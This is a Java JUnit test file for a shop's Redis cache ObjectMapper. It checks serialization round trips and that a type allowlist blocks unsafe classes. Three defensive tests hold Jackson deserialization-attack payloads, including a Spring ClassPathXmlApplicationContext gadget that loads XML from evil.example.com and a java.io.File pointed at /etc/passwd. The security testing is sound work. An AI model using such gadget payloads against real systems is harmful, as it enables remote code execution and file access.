package com.personal.marketnote.product.configuration;

import com.fasterxml.jackson.annotation.JsonAutoDetect;
import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.annotation.PropertyAccessor;
import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.DeserializationFeature;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.exc.InvalidTypeIdException;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.datatype.hibernate5.jakarta.Hibernate5JakartaModule;
import com.fasterxml.jackson.datatype.jdk8.Jdk8Module;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import com.personal.marketnote.common.domain.EntityStatus;
import com.personal.marketnote.product.domain.pricepolicy.PricePolicy;
import com.personal.marketnote.product.domain.pricepolicy.PricePolicySnapshotState;
import com.personal.marketnote.product.domain.pricepolicy.Rate;
import com.personal.marketnote.product.domain.product.Product;
import com.personal.marketnote.product.domain.product.ProductSnapshotState;
import com.personal.marketnote.product.domain.product.ProductTag;
import com.personal.marketnote.product.domain.product.ProductTagSnapshotState;
import com.personal.marketnote.product.port.in.result.product.ProductCatalogItemResult;
import com.personal.marketnote.product.port.in.result.product.ProductCatalogOptionSnapshot;
import com.personal.marketnote.product.port.in.result.product.ProductCatalogTagSnapshot;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * CacheConfig ObjectMapper 직렬화/역직렬화 왕복 테스트
 * <p>
 * GenericJackson2JsonRedisSerializer는 역직렬화 시 Object.class로 읽으므로,
 * mapper.readValue(json, Object.class)로 테스트해야 실제 Redis 캐시 동작을 재현한다.
 * <p>
 * 근본 원인: stream().toList()가 반환하는 ImmutableCollections$ListN은 package-private 클래스로,
 * Jackson NON_FINAL defaultTyping에서 최상위 레벨 직렬화 시 타입 래퍼가 누락된다.
 * ArrayList는 공개 클래스이므로 ["java.util.ArrayList", [...]] 형태로 정상 직렬화된다.
 */
class CacheConfigObjectMapperTest {

    private static final UUID TEST_PRODUCT_KEY = UUID.fromString("018f0000-0000-7000-8000-000000000001");

    private ObjectMapper createCacheObjectMapper() {
        ObjectMapper mapper = new ObjectMapper();
        mapper.activateDefaultTyping(
                BasicPolymorphicTypeValidator.builder()
                        .allowIfSubType("com.personal.marketnote.")
                        .allowIfSubType("java.util.")
                        .allowIfSubType("java.time.")
                        .allowIfSubType("java.math.")
                        .allowIfSubType("java.lang.")
                        .build(),
                ObjectMapper.DefaultTyping.NON_FINAL,
                JsonTypeInfo.As.PROPERTY
        );
        mapper.setVisibility(PropertyAccessor.GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.IS_GETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.SETTER, JsonAutoDetect.Visibility.NONE);
        mapper.setVisibility(PropertyAccessor.FIELD, JsonAutoDetect.Visibility.ANY);
        mapper.configure(DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES, false);
        mapper.registerModule(new Jdk8Module());
        mapper.registerModule(new Hibernate5JakartaModule());
        mapper.registerModule(new JavaTimeModule());
        return mapper;
    }

    private PricePolicy createTestPricePolicy() {
        return PricePolicy.from(
                PricePolicySnapshotState.builder()
                        .id(1L)
                        .price(10000L)
                        .discountPrice(8000L)
                        .discountRate(Rate.of(BigDecimal.valueOf(20.0)))
                        .accumulatedPoint(100L)
                        .accumulationRate(Rate.of(BigDecimal.valueOf(1.3)))
                        .popularity(5L)
                        .status(EntityStatus.ACTIVE)
                        .orderNum(1L)
                        .optionIds(List.of(1L, 2L))
                        .build()
        );
    }

    private Product createTestProduct() {
        ProductTag tag = ProductTag.from(
                ProductTagSnapshotState.builder()
                        .id(1L)
                        .productId(1L)
                        .name("테스트태그")
                        .orderNum(1L)
                        .status(EntityStatus.ACTIVE)
                        .build()
        );

        PricePolicy pricePolicy = createTestPricePolicy();

        return Product.from(
                ProductSnapshotState.builder()
                        .id(1L)
                        .productKey(TEST_PRODUCT_KEY)
                        .sellerId(2L)
                        .name("테스트 상품")
                        .brandName("테스트 브랜드")
                        .detail("상세 설명")
                        .defaultPricePolicy(pricePolicy)
                        .sales(10)
                        .viewCount(100L)
                        .popularity(50L)
                        .findAllOptionsYn(true)
                        .productTags(List.of(tag))
                        .orderNum(1L)
                        .status(EntityStatus.ACTIVE)
                        .build()
        );
    }

    @Test
    @DisplayName("ImmutableList(toList())로 반환된 리스트는 최상위 레벨 역직렬화 시 실패한다")
    void immutableList_shouldFailOnTopLevelDeserialization() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<PricePolicy> pricePolicies = Stream.of(createTestPricePolicy()).toList();

        // when
        String json = mapper.writeValueAsString(pricePolicies);

        // then - ImmutableList는 타입 래퍼가 누락되어 역직렬화 실패
        assertThatCode(() -> mapper.readValue(json, Object.class))
                .isInstanceOf(Exception.class)
                .hasMessageContaining("Unexpected token (START_OBJECT), expected VALUE_STRING");
    }

    @Test
    @DisplayName("ArrayList로 반환된 리스트는 최상위 레벨 역직렬화 시 성공한다")
    void arrayList_shouldSucceedOnTopLevelDeserialization() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<PricePolicy> pricePolicies = Stream.of(createTestPricePolicy())
                .collect(Collectors.toCollection(ArrayList::new));

        // when
        String json = mapper.writeValueAsString(pricePolicies);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList).hasSize(1);
        assertThat(resultList.get(0)).isInstanceOf(PricePolicy.class);
    }

    @Test
    @DisplayName("Product 단일 객체의 직렬화/역직렬화 왕복이 성공한다")
    void product_shouldSucceedOnRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        Product product = createTestProduct();

        // when
        String json = mapper.writeValueAsString(product);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(Product.class);
        Product result = (Product) deserialized;
        assertThat(result.getId()).isEqualTo(1L);
        assertThat(result.getProductKey()).isEqualTo(TEST_PRODUCT_KEY);
        assertThat(result.getName()).isEqualTo("테스트 상품");
        assertThat(result.isActive()).isTrue();
        assertThat(result.getProductTags()).hasSize(1);
        assertThat(result.getProductTags().get(0).getName()).isEqualTo("테스트태그");
        assertThat(result.getProductTags().get(0).getStatus()).isEqualTo(EntityStatus.ACTIVE);
    }

    @Test
    @DisplayName("Product ArrayList의 직렬화/역직렬화 왕복이 성공한다")
    void productArrayList_shouldSucceedOnRoundTrip() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<Product> products = Stream.of(createTestProduct())
                .collect(Collectors.toCollection(ArrayList::new));

        // when
        String json = mapper.writeValueAsString(products);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList).hasSize(1);
        assertThat(resultList.get(0)).isInstanceOf(Product.class);
    }

    private ProductCatalogItemResult createTestCatalogItemResult() {
        return new ProductCatalogItemResult(
                1L,
                10L,
                20L,
                30L,
                "테스트 상품",
                "테스트 브랜드",
                10000L,
                8000L,
                BigDecimal.valueOf(20.0),
                100L,
                BigDecimal.valueOf(1.3),
                1L,
                5L,
                "https://example.com/image.jpg",
                new ArrayList<>(List.of("https://example.com/r1.jpg", "https://example.com/r2.jpg")),
                50,
                10,
                BigDecimal.valueOf(4.5),
                100L,
                new ArrayList<>(List.of(new ProductCatalogTagSnapshot(1L, "태그1", 1L))),
                new ArrayList<>(List.of(new ProductCatalogOptionSnapshot(1L, "옵션내용"))),
                "ACTIVE"
        );
    }

    @Test
    @DisplayName("List<ProductCatalogItemResult> 라운드트립 시 element 타입을 정확히 복원한다")
    void listOfCatalogItemResult_shouldRoundTripPreservingElementType() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<ProductCatalogItemResult> items = new ArrayList<>(List.of(createTestCatalogItemResult()));

        // when
        String json = mapper.writeValueAsString(items);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        List<?> resultList = (List<?>) deserialized;
        assertThat(resultList).hasSize(1);
        assertThat(resultList.get(0)).isInstanceOf(ProductCatalogItemResult.class);
    }

    @Test
    @DisplayName("단일 ProductCatalogItemResult 라운드트립 시 필드 값을 그대로 복원한다")
    void singleCatalogItemResult_shouldRoundTripPreservingFieldValues() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        ProductCatalogItemResult original = createTestCatalogItemResult();

        // when
        String json = mapper.writeValueAsString(original);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(ProductCatalogItemResult.class);
        ProductCatalogItemResult result = (ProductCatalogItemResult) deserialized;
        assertThat(result.pricePolicyId()).isEqualTo(1L);
        assertThat(result.name()).isEqualTo("테스트 상품");
        assertThat(result.brandName()).isEqualTo("테스트 브랜드");
        assertThat(result.price()).isEqualTo(10000L);
        assertThat(result.status()).isEqualTo("ACTIVE");
    }

    @Test
    @DisplayName("빈 List<ProductCatalogItemResult> 라운드트립 시 빈 컬렉션을 반환한다")
    void emptyListOfCatalogItemResult_shouldRoundTripPreservingEmpty() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        List<ProductCatalogItemResult> empty = new ArrayList<>();

        // when
        String json = mapper.writeValueAsString(empty);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(List.class);
        assertThat((List<?>) deserialized).isEmpty();
    }

    @Test
    @DisplayName("화이트리스트 외 패키지 클래스(com.example.evil.Foo)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void unwhitelistedPackage_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson = "[\"com.example.evil.Foo\",{\"x\":1}]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("화이트리스트 외 표준 라이브러리(java.io.File)는 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void javaIoFile_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson = "[\"java.io.File\",\"/etc/passwd\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("알려진 가젯 체인(ClassPathXmlApplicationContext)은 역직렬화 시 InvalidTypeIdException을 발생시킨다")
    void springGadgetChain_shouldThrowInvalidTypeIdException() {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        String maliciousJson =
                "[\"org.springframework.context.support.ClassPathXmlApplicationContext\",\"http://evil.example.com/exploit.xml\"]";

        // when & then
        assertThatThrownBy(() -> mapper.readValue(maliciousJson, Object.class))
                .isInstanceOf(InvalidTypeIdException.class);
    }

    @Test
    @DisplayName("ProductCatalogItemResult 내부 BigDecimal/List<String>/List<Snapshot> 중첩 필드를 정확히 복원한다")
    void nestedFields_shouldRoundTripPreservingValues() throws JsonProcessingException {
        // given
        ObjectMapper mapper = createCacheObjectMapper();
        ProductCatalogItemResult original = createTestCatalogItemResult();

        // when
        String json = mapper.writeValueAsString(original);
        Object deserialized = mapper.readValue(json, Object.class);

        // then
        assertThat(deserialized).isInstanceOf(ProductCatalogItemResult.class);
        ProductCatalogItemResult result = (ProductCatalogItemResult) deserialized;
        assertThat(result.discountRate()).isEqualByComparingTo(BigDecimal.valueOf(20.0));
        assertThat(result.reviewAverageRating()).isEqualByComparingTo(BigDecimal.valueOf(4.5));
        assertThat(result.resizedImageUrls())
                .containsExactly("https://example.com/r1.jpg", "https://example.com/r2.jpg");
        assertThat(result.productTags()).hasSize(1);
        assertThat(result.productTags().get(0)).isInstanceOf(ProductCatalogTagSnapshot.class);
        assertThat(result.productTags().get(0).name()).isEqualTo("태그1");
        assertThat(result.selectedOptions()).hasSize(1);
        assertThat(result.selectedOptions().get(0)).isInstanceOf(ProductCatalogOptionSnapshot.class);
        assertThat(result.selectedOptions().get(0).content()).isEqualTo("옵션내용");
    }
}
